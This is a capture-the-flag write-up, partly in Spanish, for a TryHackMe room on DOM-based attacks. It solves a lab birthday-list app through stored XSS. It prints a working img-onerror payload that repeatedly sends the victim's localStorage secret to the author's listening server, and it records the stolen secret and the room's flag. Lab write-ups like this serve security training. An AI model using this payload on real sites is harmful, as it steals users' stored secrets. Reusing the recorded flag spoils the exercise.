---
tags: 
    - tryhackme
---

# DOM-Based Attacks

https://tryhackme.com/room/dombasedattacks

## Task 7

You can then navigate to http://lists.tryhackme.loc:5173/(opens in new tab) . Here, you will find a simple birthday list application that is vulnerable to a stored DOM-based XSS attack. While you can add and update birthdays, you cannot delete them. You aim to weaponise the XSS vulnerability to recover the information required to delete birthdays. Once you delete all of them, you will receive your flag!


### Enumeration of a Modern Frontend Application

In order to do this challenge and answer the questions, you will need to analyse the Vue application. Navigating to the application you will see the following:

![alt text](img/image.png)

If you simply use View Page Source, this doesn't really help you a lot:

![alt text](img/image-8.png)

However, the browser will actually rebuild the Vue application for us in the debugger. You can access the debugger by Right-Clicking, selecting Inspect, and then clicking the Debugger tab. You will see the following:

![alt text](img/image-9.png)

Using this, you can navigate to src -> components, which will show you the rebuilt (referred to as mapped) Vue files, as shown below:

![alt text](img/image-10.png)

You will have to use this feature to solve the challenge and answer the questions below!

Hint: You need to trick another application user into giving you sensitive information. However, if you alert this user, they will become suspicious and simply stop using the application. You can console them by either logging while you perform your tests or restarting the entire machine. Furthermore, if you are able to get an interaction from the user but it isn't exactly what you were hoping for, perhaps the answer is to monitor the user closer and for longer!

![alt text](img/image-1.png)


```bash
python3 -m http.server 8080 
```

Insertar nuevo usuario con el siguiente código:
```bash
<img src=1 onerror="setInterval(() => {fetch('http://10.9.244.36:8080?secret=' + encodeURIComponent(localStorage.getItem('secret')), {method: 'GET'});}, 6000);">
```

![alt text](img/image-2.png)

Abrir una nueva ventana para cargar los datos

![alt text](img/image-3.png)

obtenemos: /?secret=thisisthesupersecretvalue

![alt text](img/image-4.png)

![alt text](img/image-5.png)

ahora es posible borrar la lista:

![alt text](img/image-6.png)

```bash
http://lists.tryhackme.loc:5001/ping
```

![alt text](img/image-7.png)

```bash
THM{Weaponising.DOM.Based.XSS.For.Fun.And.Profit}
```

![alt text](img/image-11.png)

## Task 8

### Defences

To defend against DOM-based attacks, it is important to once again treat all user input as unsafe, even when it is still just being processed by the browser. SAST and DAST tooling can also scan code, requests and responses for potential sources and sinks where sanitisation and validation have not been implemented.